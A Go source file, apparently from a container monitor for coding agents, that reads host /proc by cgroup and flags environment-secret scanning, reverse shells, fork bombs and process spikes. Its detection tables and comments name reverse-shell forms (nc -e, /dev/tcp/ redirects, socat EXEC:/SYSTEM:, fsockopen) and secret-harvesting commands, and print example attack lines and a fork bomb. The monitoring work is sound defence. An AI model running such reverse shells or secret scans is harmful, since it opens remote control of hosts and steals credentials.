package monitor

import (
	"context"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
)

// CollectProcessStats collects running processes by walking the host /proc
// filtered to the container's PID namespace. Because the read happens outside
// the container, an attacker inside cannot hide processes by manipulating their
// own /proc, replacing ps, or pausing incus exec.
func CollectProcessStats(ctx context.Context, containerName string) (ProcessStats, error) {
	processes, err := collectProcessesViaHostProc(ctx, containerName)
	if err != nil {
		return ProcessStats{Available: false}, fmt.Errorf("process monitoring unavailable: %w", err)
	}

	for i := range processes {
		processes[i].EnvAccess = checkEnvAccess(processes[i].Command)
	}
	return ProcessStats{
		Available:  true,
		TotalCount: len(processes),
		Processes:  processes,
	}, nil
}

// collectProcessesViaHostProc walks the host /proc directory and returns all
// processes that belong to the container's cgroup subtree. Using cgroup
// membership avoids the ptrace permission required to read /proc/<pid>/ns/pid
// symlinks (which restricts namespace-inode comparison to root or
// CAP_SYS_PTRACE). /proc/<pid>/cgroup is world-readable on Linux. This also
// naturally covers processes that create nested PID namespaces inside the
// container via unshare -p.
func collectProcessesViaHostProc(ctx context.Context, containerName string) ([]Process, error) {
	rawPath, err := GetCgroupPath(ctx, containerName)
	if err != nil {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}
		return nil, fmt.Errorf("could not resolve container cgroup path: %w", err)
	}

	// GetCgroupPath may return the init process's sub-scope (e.g. /init.scope)
	// when falling back to incus info. Strip it so the prefix match covers all
	// processes in the container, not just init.scope — same strip
	// CollectResourceStats uses so both views agree on the container root.
	cgroupPath := stripSystemdScopeSuffix(rawPath)

	// /proc/<pid>/cgroup lines use paths relative to /sys/fs/cgroup.
	// e.g. "0::/incus.monitor/coi-abc123-1"
	const cgroupMount = "/sys/fs/cgroup"
	relCgroup := strings.TrimPrefix(cgroupPath, cgroupMount)
	if relCgroup == cgroupPath {
		return nil, fmt.Errorf("unexpected cgroup path format (no %s prefix): %s", cgroupMount, cgroupPath)
	}

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, fmt.Errorf("could not read /proc: %w", err)
	}

	var processes []Process
	for _, entry := range entries {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}
		if !entry.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue // not a PID directory
		}

		cgroupData, err := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
		if err != nil || !processBelongsToContainerCgroup(string(cgroupData), relCgroup) {
			continue
		}

		proc, err := readProcessFromProc(pid)
		if err != nil {
			continue
		}
		processes = append(processes, proc)
	}

	// A running container must have at least its init process visible. Zero
	// results indicate a cgroup mismatch or permission problem rather than a
	// genuinely empty container.
	if len(processes) == 0 {
		return nil, fmt.Errorf("no processes found in container cgroup %s — cgroup path mismatch or hidepid", relCgroup)
	}

	return processes, nil
}

// processBelongsToContainerCgroup reports whether the /proc/<pid>/cgroup
// content places the process inside the container's cgroup subtree.
// Cgroup v2 format: "0::<relative-path>"
func processBelongsToContainerCgroup(cgroupContent, containerRelCgroup string) bool {
	for _, line := range strings.Split(cgroupContent, "\n") {
		if !strings.HasPrefix(line, "0::") {
			continue
		}
		procCgroup := strings.TrimSpace(strings.TrimPrefix(line, "0::"))
		if procCgroup == containerRelCgroup || strings.HasPrefix(procCgroup, containerRelCgroup+"/") {
			return true
		}
	}
	return false
}

// readProcessFromProc reads /proc/<pid>/status and /proc/<pid>/cmdline to build
// a Process. The PID here is the host-side PID.
func readProcessFromProc(pid int) (Process, error) {
	statusData, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return Process{}, err
	}

	name, ppid, uid := parseStatusFields(string(statusData))

	command := name
	if cmdlineData, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid)); err == nil && len(cmdlineData) > 0 {
		command = parseCmdline(cmdlineData)
	}

	return Process{
		PID:  pid,
		PPID: ppid,
		// User is the real (host-side) UID as a decimal string. Unlike the
		// old incus exec ps aux path, this is numeric rather than a username.
		User:    strconv.Itoa(uid),
		Command: command,
	}, nil
}

// parseStatusFields extracts Name, PPid, and real Uid from /proc/<pid>/status
// content. Kept separate so it can be unit-tested without a live /proc.
func parseStatusFields(status string) (name string, ppid, uid int) {
	for _, line := range strings.Split(status, "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		switch fields[0] {
		case "Name:":
			name = fields[1]
		case "PPid:":
			ppid, _ = strconv.Atoi(fields[1])
		case "Uid:":
			uid, _ = strconv.Atoi(fields[1]) // real UID is the first field
		}
	}
	return
}

// parseCmdline converts null-delimited /proc/<pid>/cmdline bytes to a
// space-joined command string. Kept separate so it can be unit-tested.
func parseCmdline(data []byte) string {
	trimmed := strings.TrimRight(string(data), "\x00")
	if trimmed == "" {
		return ""
	}
	return strings.Join(strings.Split(trimmed, "\x00"), " ")
}

// checkEnvAccess checks if a command is likely accessing environment variables
func checkEnvAccess(command string) bool {
	// Check for common environment-scanning commands
	envCommands := []string{
		"env",
		"printenv",
		"set",
		"export",
	}

	cmdLower := strings.ToLower(command)

	// Check if command is exactly one of the env commands
	for _, envCmd := range envCommands {
		if strings.HasPrefix(cmdLower, envCmd+" ") || cmdLower == envCmd {
			return true
		}
	}

	// Check for grep/awk/sed parsing environment variables with secret-related keywords
	secretKeywords := []string{"api", "key", "password", "secret", "token", "credential", "auth"}
	if strings.Contains(cmdLower, "grep") || strings.Contains(cmdLower, "awk") || strings.Contains(cmdLower, "sed") {
		for _, keyword := range secretKeywords {
			if strings.Contains(cmdLower, keyword) {
				return true
			}
		}
	}

	// Check for /proc/*/environ access via any tool
	if strings.Contains(cmdLower, "/proc/") && strings.Contains(cmdLower, "environ") {
		return true
	}

	// Check for language-specific environment access patterns
	langEnvPatterns := []string{
		// Python: os.environ, os.getenv
		"os.environ",
		"os.getenv",
		// Node.js: process.env
		"process.env",
		// Ruby: ENV[
		"env[",
		// awk ENVIRON array
		"environ[",
	}
	for _, pattern := range langEnvPatterns {
		if strings.Contains(cmdLower, pattern) {
			return true
		}
	}

	// Check for binary tools reading /proc/*/environ
	procEnvTools := []string{
		"strings /proc",
		"xxd /proc",
		"hexdump /proc",
		"xargs",
	}
	for _, tool := range procEnvTools {
		if strings.Contains(cmdLower, tool) && strings.Contains(cmdLower, "environ") {
			return true
		}
	}

	// Check for xargs specifically reading null-delimited environ files
	if strings.Contains(cmdLower, "xargs") && strings.Contains(cmdLower, "/proc/") {
		return true
	}

	return false
}

// Reverse-shell pattern classes. The class determines how Analyze escalates a
// match and lets operators downgrade the ambiguous class via the #842
// `[monitoring] reverse_shell_one_liners` knob without weakening the rest.
const (
	// ReverseShellClassStrong is the default: unambiguous reverse-shell
	// indicators (nc -e, /dev/tcp/, socat EXEC:, fsockopen, an interactive
	// shell, ...). Always CRITICAL — not affected by the one-liner knob.
	ReverseShellClassStrong = ""
	// ReverseShellClassOneLiner is an interpreter one-liner invocation
	// (python -c, python3 -c, perl -e, ruby -e, php -r). These fire ONLY when
	// the command also carries a real network indicator (see isNetworkRelated),
	// but they remain the most false-positive-prone class for coding agents, so
	// the reverse_shell_one_liners knob can downgrade them to "warn" or "off".
	ReverseShellClassOneLiner = "oneliner"
)

// DetectReverseShells checks processes for reverse shell indicators
func DetectReverseShells(processes []Process) []ProcessThreat {
	var threats []ProcessThreat

	reverseShellPatterns := []struct {
		pattern    string
		indicators []string
		class      string
	}{
		// Netcat reverse shells
		{"nc -e", []string{"netcat with exec"}, ReverseShellClassStrong},
		{"nc.traditional -e", []string{"netcat with exec"}, ReverseShellClassStrong},
		{"ncat -e", []string{"ncat with exec"}, ReverseShellClassStrong},
		{"nc.openbsd -e", []string{"netcat with exec"}, ReverseShellClassStrong},

		// Bash/sh reverse shells
		{"bash -i", []string{"interactive bash"}, ReverseShellClassStrong},
		{"sh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		// Matching is token-anchored (see containsAtTokenStart), so the other
		// shells that "sh -i" used to catch as a substring are listed explicitly.
		{"zsh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"ksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"dash -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"ash -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"fish -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"csh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"tcsh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"mksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"oksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"lksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"posh -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"yash -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"rbash -i", []string{"interactive shell"}, ReverseShellClassStrong},
		{"/dev/tcp/", []string{"bash tcp redirect"}, ReverseShellClassStrong},
		{"/dev/udp/", []string{"bash udp redirect"}, ReverseShellClassStrong},

		// Python reverse shells — `python -c` / `python3 -c` are the ambiguous
		// one-liner form; `socket.socket` is an unambiguous socket indicator.
		{"python -c", []string{"python one-liner"}, ReverseShellClassOneLiner},
		{"python3 -c", []string{"python one-liner"}, ReverseShellClassOneLiner},
		{"socket.socket", []string{"python socket"}, ReverseShellClassStrong},

		// Perl reverse shells
		{"perl -e", []string{"perl one-liner"}, ReverseShellClassOneLiner},
		{"perl -MIO", []string{"perl IO module"}, ReverseShellClassStrong},

		// PHP reverse shells
		{"php -r", []string{"php one-liner"}, ReverseShellClassOneLiner},
		{"fsockopen", []string{"php socket"}, ReverseShellClassStrong},

		// Ruby reverse shells
		{"ruby -rsocket", []string{"ruby socket"}, ReverseShellClassStrong},
		{"ruby -e", []string{"ruby one-liner"}, ReverseShellClassOneLiner},

		// Socat reverse shells
		{"socat", []string{"socat"}, ReverseShellClassStrong},
		{"EXEC:", []string{"socat exec"}, ReverseShellClassStrong},
		// SYSTEM: is socat's sh -c twin of EXEC:. Unlike EXEC: the bare token is
		// too common elsewhere (kube-system:, log text), so it only counts on a
		// socat command line — see reverseShellNeedsSocat.
		{"SYSTEM:", []string{"socat system"}, ReverseShellClassStrong},

		// PowerShell reverse shells (if Wine/mono present)
		{"powershell", []string{"powershell"}, ReverseShellClassStrong},
		{"System.Net.Sockets", []string{"dotnet sockets"}, ReverseShellClassStrong},
	}

	for _, proc := range processes {
		cmdLower := strings.ToLower(proc.Command)

		// The interpreter one-liner patterns (python -c, perl -e, ruby -e,
		// php -r, ...) are only a threat when the command actually carries a
		// network indicator. Require a real one — a socket/tcp/udp keyword, an
		// IP, or a host:port endpoint — NOT a bare ':' (issue #842): agent Bash
		// tools wrap commands in a shell-snapshot line and quote code that
		// almost always contains ':' (PATH entries like /usr/bin:/bin, dict
		// literals like {"k": v}, URLs, log text), so a bare-':' check turned
		// every agent-run `python -c` / `perl -e` / `ruby -e` / `php -r` into a
		// kill-on-sight false positive.
		networkRelated := isNetworkRelated(cmdLower)

		// Pick the strongest matching pattern rather than the first one in the
		// table. A command that matches an interpreter one-liner (downgradeable
		// via the reverse_shell_one_liners knob) AND an unambiguous indicator
		// (socket.socket, fsockopen, EXEC:, ...) must be classified STRONG, so
		// the knob can never downgrade a genuine reverse shell that carries an
		// always-critical indicator. Without this, table order + first-match
		// would tag `php -r $s=fsockopen(...)` as a one-liner and "off"/"warn"
		// would suppress it (code-review #842).
		matched := -1
		for i := range reverseShellPatterns {
			p := &reverseShellPatterns[i]
			if !containsAtTokenStart(cmdLower, strings.ToLower(p.pattern)) {
				continue
			}
			// Generic tool names (socat, powershell) are not evidence on their
			// own — `apt-get install socat` or `rg -i powershell docs/` must not
			// auto-kill the container. They need a network indicator like the
			// one-liners; the real attack forms still trip the self-sufficient
			// patterns (EXEC:, System.Net.Sockets) regardless.
			if reverseShellNeedsNetwork[p.pattern] && !networkRelated {
				continue
			}
			if reverseShellNeedsSocat[p.pattern] && !containsAtTokenStart(cmdLower, "socat") {
				continue
			}
			if refine, ok := reverseShellRefine[p.pattern]; ok && !refine(cmdLower) {
				continue
			}
			// The network-indicator gate constrains ONLY the ambiguous
			// interpreter one-liner class (#842). Strong/unambiguous patterns
			// (nc -e, socat, EXEC:, /dev/tcp/, an interactive shell,
			// socket.socket, ...) are self-sufficient evidence and never require
			// corroboration — a bare `socat EXEC:bash` carries no sock/tcp/IP
			// token yet is unmistakably a reverse shell (code-review #842: the
			// removed bare-':' check had been the only thing catching it).
			if p.class == ReverseShellClassOneLiner && !networkRelated {
				continue
			}
			if matched < 0 {
				matched = i
			}
			if p.class == ReverseShellClassStrong {
				matched = i
				break // strong wins outright — stop looking
			}
		}
		if matched >= 0 {
			p := reverseShellPatterns[matched]
			threats = append(threats, ProcessThreat{
				PID:        proc.PID,
				Command:    proc.Command,
				User:       proc.User,
				Pattern:    p.pattern,
				Indicators: p.indicators,
				Class:      p.class,
			})
		}
	}

	return threats
}

// reverseShellNeedsNetwork lists STRONG patterns that are only bare tool names:
// they stay always-critical when they fire, but only fire alongside a network
// indicator (see isNetworkRelated), exactly like the one-liner class.
var reverseShellNeedsNetwork = map[string]bool{
	"socat":      true,
	"powershell": true,
}

// reverseShellNeedsSocat lists socat address keywords that are self-sufficient
// evidence only on a socat command line. They fire regardless of a network
// indicator, so `socat OPENSSL:attacker:443 SYSTEM:sh` (dotless host, decimal
// or IPv6 address) is still caught — while `rg "exec:" src/` is not.
var reverseShellNeedsSocat = map[string]bool{
	"EXEC:":   true,
	"SYSTEM:": true,
}

// reverseShellRefine narrows patterns whose literal text is also common in
// benign commands: the pattern only counts when its predicate holds. Searching
// for /dev/tcp/ (grep, rg) or loading IO::File must not kill the container.
var reverseShellRefine = map[string]func(cmdLower string) bool{
	"/dev/tcp/": devNetRedirectNonLoopback,
	"/dev/udp/": devNetRedirectNonLoopback,
	"perl -MIO": perlLoadsIOSocket,
}

// containsAtTokenStart reports whether pat occurs in s at the start of a token,
// i.e. not glued to a preceding letter, digit, underscore, '.' or '-'. Plain
// substring matching flagged benign commands: `rsync -e ssh` contains "nc -e",
// `ssh -i key host` and `./setup.sh -i` contain "sh -i". A path prefix still
// counts as a token boundary, so `/usr/bin/nc -e` and `/bin/sh -i` keep matching.
func containsAtTokenStart(s, pat string) bool {
	for from := 0; ; {
		i := strings.Index(s[from:], pat)
		if i < 0 {
			return false
		}
		i += from
		if i == 0 || !isTokenGlue(s[i-1]) {
			return true
		}
		from = i + 1
	}
}

// isTokenGlue reports whether b, directly before a pattern, makes it part of a
// longer token (a name like kube-sh or setup.sh) rather than its own word.
func isTokenGlue(b byte) bool {
	return isWordByte(b) || b == '.' || b == '-'
}

func isWordByte(b byte) bool {
	return b == '_' || (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z') || (b >= '0' && b <= '9')
}

// hostPortRe matches an explicit network endpoint — an IPv4 address or a
// dotted hostname (needs a TLD-like final label) followed by ':' and a numeric
// port. Requiring a dot in the host is what keeps it from matching dict
// literals ({"k":1}), "hello: world", or PATH fragments (/usr/bin:/bin), which
// is the whole point of #842's fix.
var hostPortRe = regexp.MustCompile(`(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9-]*(?:\.[a-z0-9-]+)+):\d{1,5}\b`)

// isNetworkRelated reports whether a reverse-shell candidate command actually
// carries a network indicator. It deliberately does NOT treat a bare ':' as an
// indicator, nor a bare "connect" substring — both fire on benign agent
// one-liners (e.g. db.connect(), a PATH with ':') and re-open issue #842. Real
// reverse shells in these interpreters always carry a socket/tcp/udp keyword,
// an IP, or a host:port endpoint alongside any connect() call.
//
// "socket"/"fsockopen"/"sockaddr" rather than a bare "sock": the latter matched
// docker.sock and $SSH_AUTH_SOCK in ordinary agent commands. Loopback
// endpoints (an agent health-checking its own dev server at 127.0.0.1:8000)
// and source locations (file.py:12) are not network indicators either.
func isNetworkRelated(cmdLower string) bool {
	return strings.Contains(cmdLower, "socket") || // socket.socket, tcpsocket, IO::Socket, ...
		strings.Contains(cmdLower, "fsockopen") ||
		strings.Contains(cmdLower, "sockaddr") ||
		strings.Contains(cmdLower, "tcp") ||
		strings.Contains(cmdLower, "udp") ||
		containsIPPattern(cmdLower) ||
		containsRemoteHostPort(cmdLower)
}

// sourceFileExts are extensions that make "name.ext:NN" a file:line reference
// (compiler output, grep -n, stack traces) rather than a host:port endpoint.
var sourceFileExts = map[string]bool{
	"py": true, "js": true, "ts": true, "tsx": true, "jsx": true, "mjs": true,
	"go": true, "rb": true, "rs": true, "sh": true, "c": true, "h": true,
	"cc": true, "cpp": true, "hpp": true, "java": true, "kt": true, "php": true,
	"pl": true, "md": true, "txt": true, "json": true, "yaml": true, "yml": true,
	"toml": true, "lock": true, "log": true, "html": true, "css": true,
	"sql": true, "cfg": true, "ini": true, "conf": true, "xml": true, "csv": true,
}

// containsRemoteHostPort reports whether cmdLower has a hostPortRe endpoint
// that is neither loopback nor a file:line reference.
func containsRemoteHostPort(cmdLower string) bool {
	for _, m := range hostPortRe.FindAllString(cmdLower, -1) {
		host := m[:strings.LastIndexByte(m, ':')]
		if isLoopbackHost(host) {
			continue
		}
		if dot := strings.LastIndexByte(host, '.'); dot >= 0 && sourceFileExts[host[dot+1:]] {
			continue
		}
		return true
	}
	return false
}

// isLoopbackHost reports whether host names this machine. A connection there
// can't reach an attacker, so it is not reverse-shell evidence.
func isLoopbackHost(host string) bool {
	return host == "localhost" || host == "0.0.0.0" || host == "::1" || host == "[::1]" ||
		strings.HasPrefix(host, "127.")
}

// devNetRedirectNonLoopback reports whether cmdLower opens a bash /dev/tcp or
// /dev/udp socket to a non-loopback host. The path only connects when it is a
// redirection target (`>& /dev/tcp/h/p`, `<>/dev/tcp/...`, `< /dev/tcp/...`),
// so a mere mention (`grep -rn /dev/tcp/ docs`) is skipped — as is a port
// probe of the agent's own services (`</dev/tcp/localhost/5432`).
func devNetRedirectNonLoopback(cmdLower string) bool {
	for _, dev := range []string{"/dev/tcp/", "/dev/udp/"} {
		for from := 0; ; {
			i := strings.Index(cmdLower[from:], dev)
			if i < 0 {
				break
			}
			i += from
			from = i + len(dev)

			j := i - 1
			for j >= 0 && (cmdLower[j] == ' ' || cmdLower[j] == '\t') {
				j--
			}
			if j < 0 || !strings.ContainsRune("<>&", rune(cmdLower[j])) {
				continue // not a redirection target
			}
			host := cmdLower[from:]
			if k := strings.IndexByte(host, '/'); k >= 0 {
				host = host[:k]
			}
			if !isLoopbackHost(host) {
				return true
			}
		}
	}
	return false
}

// perlIOSocketRe matches perl loading the IO bundle (`-MIO`, which pulls in
// IO::Socket) or IO::Socket itself — but not unrelated IO::* modules such as
// IO::File or IO::Handle.
var perlIOSocketRe = regexp.MustCompile(`(?:^|\s)-mio(?:::socket|\s|$)`)

// perlLoadsIOSocket reports whether a perl command line loads IO::Socket via -M.
func perlLoadsIOSocket(cmdLower string) bool {
	return perlIOSocketRe.MatchString(cmdLower)
}

// containsIPPattern reports whether the command contains a whitespace-delimited
// dotted-quad IPv4 address (e.g. the `192.168.1.100` of `nc -e /bin/bash
// 192.168.1.100 4444`). It matches only standalone tokens and validates each
// octet is 0–255, so a dotted number glued into other text — a quoted version
// string like "1.2.3.4" in a benign one-liner's output — is not mistaken for an
// endpoint (code-review #842). IPs embedded in punctuation inside a real reverse
// shell (e.g. a Python `("10.0.0.1",4444)` tuple) still trip isNetworkRelated
// via the accompanying socket keyword or the host:port form.
func containsIPPattern(cmd string) bool {
	for _, part := range strings.Fields(cmd) {
		octets := strings.Split(part, ".")
		if len(octets) != 4 {
			continue
		}
		valid := true
		for _, octet := range octets {
			n, err := strconv.Atoi(octet)
			if err != nil || n < 0 || n > 255 {
				valid = false
				break
			}
		}
		if valid {
			return true
		}
	}
	return false
}

// DetectProcessCountSpike checks whether the total number of processes in the
// container exceeds the configured threshold. A sudden spike is the primary
// indicator of a fork bomb (:(){:|:&};:) or runaway process spawner.
// Returns nil when threshold is 0 (disabled) or not exceeded.
func DetectProcessCountSpike(stats ProcessStats, threshold int) *ProcessCountThreat {
	if threshold <= 0 || !stats.Available {
		return nil
	}
	if stats.TotalCount > threshold {
		return &ProcessCountThreat{
			Count:     stats.TotalCount,
			Threshold: threshold,
		}
	}
	return nil
}

// DetectProcessSpawnRate checks whether processes spawned faster than threshold
// since the last poll. Returns nil when threshold is 0 (disabled) or when
// previous is negative (first poll — no baseline yet).
func DetectProcessSpawnRate(current, previous, threshold int) *ProcessCountThreat {
	if threshold <= 0 || previous < 0 {
		return nil
	}
	delta := current - previous
	if delta > threshold {
		return &ProcessCountThreat{
			Count:     current,
			Threshold: threshold,
			Delta:     delta,
		}
	}
	return nil
}

// DetectEnvScanning checks processes for environment variable scanning
func DetectEnvScanning(processes []Process) []ProcessThreat {
	var threats []ProcessThreat

	for _, proc := range processes {
		if proc.EnvAccess {
			threats = append(threats, ProcessThreat{
				PID:        proc.PID,
				Command:    proc.Command,
				User:       proc.User,
				Pattern:    "environment scanning",
				Indicators: []string{"accessing environment variables"},
			})
		}
	}

	return threats
}
